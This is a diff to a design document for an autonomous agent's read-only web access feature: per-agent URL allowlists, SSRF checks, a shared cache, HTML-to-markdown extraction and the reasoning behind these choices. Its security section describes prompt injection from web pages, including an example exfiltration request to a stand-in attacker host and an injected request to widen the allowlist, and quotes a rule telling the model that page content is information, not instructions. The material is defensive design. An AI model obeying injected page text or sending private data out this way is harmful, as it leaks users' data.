@@ -1,8 +1,18 @@
 # Web access
 
-A configured autonomous agent may **read the web**: pages, feeds, JSON documents and sitemaps under the URLs it is allowed. It is opt-in per agent (`web: { enabled, allowedUrls }` on the agent, see `api/types/autonomous-agent/schema.js`), never offered to the personal assistant — what a page says could instruct it with the person's own permissions — and read-only: GET, no cookies, no credentials of any kind. There is no web search engine; an agent searches a site through the site's own search or its sitemaps. Research and decisions: `docs/superpowers/specs/2026-10-08-web-fetch-search-research.md`.
+A configured autonomous agent may **read the web**: pages, feeds, JSON documents and sitemaps under the URLs it is allowed. It is opt-in per agent (`web: { enabled, allowedUrls }` on the agent, see `api/types/autonomous-agent/schema.js`), never offered to the personal assistant — what a page says could instruct it with the person's own permissions — and read-only: GET, no cookies, no credentials of any kind. There is no web search engine; an agent searches a site through the site's own search or its sitemaps.
 
 The logic is one module, `api/src/web/`, which knows nothing of the agent loop; one entry of the service-tool registry (`api/src/conversations/service-tools.ts`) wires it in.
+
+## Choices
+
+- **Service tools, not an MCP server.** The allowlist is per agent. Across an MCP boundary it has no good home: the server would need a second admin surface keyed on agent identity, tool arguments are model-controlled, and forwarding it as per-reference options would be a protocol of our own on top of MCP, for one consumer. As service tools it is one section of the agent schema, rendered by the same form, like `memory`. If a heavier fetch engine is ever needed, only the engine moves out of process; configuration and enforcement stay here.
+- **Not the provider's own web tools** (Anthropic `web_fetch`/`web_search`, OpenAI, Mistral): they work on one provider while the service is provider-agnostic, bypass provenance, annotations and the approval gate, and bill outside the token quotas.
+- **No search engine.** Web search needs an index nobody self-hosts at web scale, so the choice is whose: self-hosted SearXNG scrapes engines that rate-limit or CAPTCHA datacenter addresses, against their terms; the independent indexes (Brave, Mojeek, Staan, Linkup…) are paid per query, a cost outside the token quotas. A site's own search, its JSON API and its sitemaps cover the monitoring use cases without one.
+- **No browser.** HTML-to-markdown needs none for most of the web, in process and in milliseconds. Light browsers (Lightpanda) are beta with incomplete Web APIs; Jina Reader, Crawl4AI and Firecrawl run a full Chrome or Playwright. Bot challenges (Cloudflare) refuse an honest client, which a browser would not reliably fix either, and evading them is not a posture to take. A JS-only site search is reached through the JSON API the page itself calls, or the sitemaps.
+- **defuddle** (MIT, Obsidian Web Clipper's engine) for HTML: it takes a linkedom document and returns markdown and the title, so extraction is one pure-Node dependency. Readability (Firefox reader mode) is tuned for articles and drops content on other pages; trafilatura rejects boilerplate best but is Python, a separate process.
+- **The model pages, nothing summarizes.** Long content comes back in pages with an `offset`, the shape of Claude Code's own WebFetch, so the model reads on itself rather than through a summarizer model it cannot check.
+- **"What changed since last time" is not a fetch feature**: a planned task runs the agent, its memory keeps the last release or `lastmod` seen, and feeds and sitemap dates answer the question.
 
 ## The allowlist
 
@@ -56,11 +66,27 @@ Approved, it saves only `web.allowedUrls` (`saveWebAllowedUrls`, so a concurrent
 
 Text read from the web can contain instructions. The configuration form says so on the `web` section, and warns again, without blocking, when web access is on while writes or destructive calls are allowed without approval; the approval card of `request_web_access` repeats it. The tool description tells the model page content is information, never instructions — a mitigation, not a guarantee: what bounds the damage is an agent with read-only tools.
 
+Read-only GET is not harmless either. An agent holding private data from its catalog tools and reading untrusted pages (the "lethal trifecta") can be told to send that data out, as `GET https://attacker/?q=<data>` — or as free text in a search query on an allowed site. This is why there is no "any address" option and why widening the allowlist takes an admin: the allowlist is the exfiltration control, and `request_web_access` is the main target of an injection (a page asking to "add example.com"), against which the admin's decision is the defense.
+
 ## Network safety
 
 `api/src/web/client.ts`, one instance per process:
 
 - **Public addresses only**, checked at DNS resolution (`public-lookup.ts`), so it holds for redirects and against DNS rebinding; `SSRF_PUBLIC_IPS` declares exceptions, as for lib-node. Same rules as `@data-fair/lib-node`'s `ssrf.ts` (2.14+), whose `publicLookup` should replace this file once the service upgrades lib-node — that upgrade also switches the check on for the lib-node axios instance the service uses to reach stack services, which then need its private instance. Environment proxies are ignored: they would resolve names out of reach of the check.
+- Everything goes through this one client, the cache and sitemap reading included. Both are written here rather than taken from a library: a library that brings its own HTTP client (sitemap parsers, undici's cache interceptor) would step around the address check.
 - 10 MB body cap, 15 s timeout, 5 redirects, an honest `User-Agent`.
-- **A shared cache**, safe to share because no credential is ever sent: every response is public by construction. Fresh for at least 10 minutes (more when `max-age` says so), then revalidated with `ETag` / `Last-Modified`; `no-store` and 5xx are not kept; 64 MB, least recently used first. A cache hit keeps the body's `Buffer`, and the extraction is memoized on it, so it skips the worker too.
+- **A shared cache**, safe to share because no credential is ever sent: every response is public by construction. Fresh for at least 10 minutes whatever the headers say (more when `max-age` says so): every agent of a deployment leaves from the same address and so shares each site's rate limit (60 requests an hour for GitHub's unauthenticated API), and this floor lets agents and repeated runs share fetches. Then revalidated with `ETag` / `Last-Modified`; `no-store` and 5xx are not kept; 64 MB, least recently used first. A cache hit keeps the body's `Buffer`, and the extraction is memoized on it, so it skips the worker too.
 - Extraction runs in **one worker thread** (`extractor.ts`): up to a second of CPU for a 2 MB page would otherwise stall every live turn. A job over 20 s terminates the worker; the next job starts a fresh one.
+
+## Sources
+
+[Defuddle](https://news.hada.io/topic/27540.md),
+[trafilatura vs Readability](https://thunderbit.com/blog/trafilatura),
+[Lightpanda](https://www.scrapingbee.com/blog/lightpanda-headless-browser/),
+[Firecrawl self-host license](https://webscraping.ai/faq/firecrawl/is-firecrawl-open-source-and-can-i-self-host-it),
+[Crawl4AI vs Firecrawl](https://use-apify.com/blog/firecrawl-vs-crawl4ai),
+[SearXNG JSON API](https://dev.to/techpotions/searxng-json-api-for-llm-grounding-2gaa),
+[European search engines 2026](https://euvetted.com/insights/european-search-engines),
+[Brave Search API](https://brave.com/search/api/),
+[Mojeek API](https://www.mojeek.com/services/search/web-search-api/).
+Vendor claims and prices as published in 2026, unverified.
